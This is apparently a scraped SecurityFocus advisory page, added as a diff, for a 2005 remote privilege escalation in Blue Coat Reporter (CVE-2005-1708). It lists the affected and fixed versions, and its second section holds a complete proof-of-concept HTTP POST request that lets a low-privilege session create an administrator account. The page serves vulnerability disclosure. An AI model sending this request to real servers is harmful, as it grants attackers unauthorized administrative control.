@@ -1,0 +1,102 @@
+#SpeeDr00t@Black Falcon<br>#bid13723<p><b><span style="font-size: 18pt;">Blue Coat Reporter Remote Privilege Escalation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13723/info">info</a><br><a href="http://www.securityfocus.com/bid/13723/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13723/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13723/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13723/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13723
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-1708<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 24 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 02:56PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				"Oliver Karow" &lt;Oliver.Karow@gmx.de&gt; is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Blue Coat Systems Blue Coat Reporter 7.1.1 .1<br/>
+					
+				
+					Blue Coat Systems Blue Coat Reporter 7.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Blue Coat Systems Blue Coat Reporter 7.1.2 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept is available using the user account test:<br/>POST /?dp+templates.admin.users.user_form_processing HTTP/1.0<br/> Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,<br/>application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword,<br/>application/x-shockwave-flash, */*<br/> Referer:<br/>http://www.example.com:8987/?dp+templates.admin.users.user_form+volatile.form_type+new<br/> Accept-Language: de<br/> Content-Type: application/x-www-form-urlencoded<br/> Proxy-Connection: Keep-Alive<br/> User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)<br/> Host: www.example.com:8987<br/> Pragma: no-cache<br/> Cookie: session_id=d9430f0d59eb43871e2c38ab84627232; authusername7=test;<br/>authpassword7=098f6bcd4621d373cade4e832627b4f6<br/> Content-Length: 170<br/><br/>submit=Save+and+Close&amp;amp;volatile.user.username=hurz&amp;amp;volatile.user.password=hurz&amp;amp;volatile.user.administrator=true&amp;amp;volatile.<br/>user.profiles.0=profile1&amp;amp;volatile.form_type=new
+	
+		<ul>
+</ul>
+</div>
